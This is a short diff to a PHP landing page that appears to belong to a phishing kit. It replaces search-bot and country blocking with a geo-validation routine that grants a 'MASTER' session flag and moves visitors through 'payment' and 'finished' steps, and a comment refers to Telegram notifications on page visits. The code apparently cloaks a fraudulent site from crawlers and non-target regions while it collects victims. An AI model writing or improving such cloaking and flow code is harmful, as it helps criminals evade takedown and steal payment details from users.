@@ -3,10 +3,21 @@ session_start();
 include __DIR__ . '/settings.php';
 include __DIR__ . '/lang_main.php';
 require_once __DIR__ . '/antibot.php';
-checkSearchEngineBot(); // Block search bots on landing page
-if (!checkCountryRestriction()) { // Block if not from allowed countries
-    require_once __DIR__ . '/antibot.php';
-    showClean404();
+
+// Validate geo and grant MASTER access
+validateGeoAndGrantMaster();
+
+// If already has MASTER, redirect to next step
+if (isset($_SESSION['MASTER']) && $_SESSION['MASTER'] === true && isset($_SESSION['step'])) {
+    $s = $_SESSION['step'];
+    $map = [
+        'payment'  => 'auth.php',
+        'finished' => 'final.php'
+    ];
+    if (isset($map[$s])) {
+        header("Location: " . $map[$s]);
+        exit();
+    }
 }
 
 // ── SEND TELEGRAM NOTIFICATION ON PAGE VISIT ──
